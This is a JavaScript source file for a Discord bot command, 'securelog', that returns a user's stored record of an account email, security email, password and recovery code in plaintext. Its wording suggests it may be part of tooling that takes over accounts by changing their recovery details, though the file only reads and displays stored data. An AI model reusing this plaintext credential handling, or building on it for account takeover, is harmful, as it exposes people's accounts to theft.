const { ApplicationCommandOptionType } = require("discord.js");
const { fetchSecureLogs } = require("../../utils/logging/secureLogStore");

module.exports = {
    name: "securelog",
    description: "Retrieve your most recent secured account details",
    enabled: true,
    userOnly: true,
    options: [
        {
            name: "email",
            description: "Filter by original account email",
            type: ApplicationCommandOptionType.String,
            required: false
        }
    ],
    callback: async (client, interaction) => {
        const filterEmail = interaction.options.getString("email");
        await interaction.deferReply({ ephemeral: true });

        const logs = await fetchSecureLogs(interaction.user.id, filterEmail, 1);

        if (!logs || logs.length === 0) {
            return interaction.editReply({
                content: filterEmail
                    ? `No stored secure logs found for email **${filterEmail}**.`
                    : "No stored secure logs found yet.",
                ephemeral: true
            });
        }

        const log = logs[0];
        const createdAt = new Date(log.created_at).toLocaleString();

        return interaction.editReply({
            embeds: [
                {
                    title: "Stored Secure Details",
                    color: 0x4caf50,
                    fields: [
                        { name: "Email", value: "```\n" + (log.email || "Unknown") + "\n```", inline: false },
                        { name: "Security Email", value: "```\n" + (log.sec_email || "Unknown") + "\n```", inline: false },
                        { name: "Password", value: "```\n" + (log.password || "Unknown") + "\n```", inline: false },
                        { name: "Recovery Code", value: "```\n" + (log.recovery_code || "Unknown") + "\n```", inline: false }
                    ],
                    footer: {
                        text: `Saved on ${createdAt}${log.context ? ` • ${log.context}` : ""}`
                    }
                }
            ],
            ephemeral: true
        });
    }
};

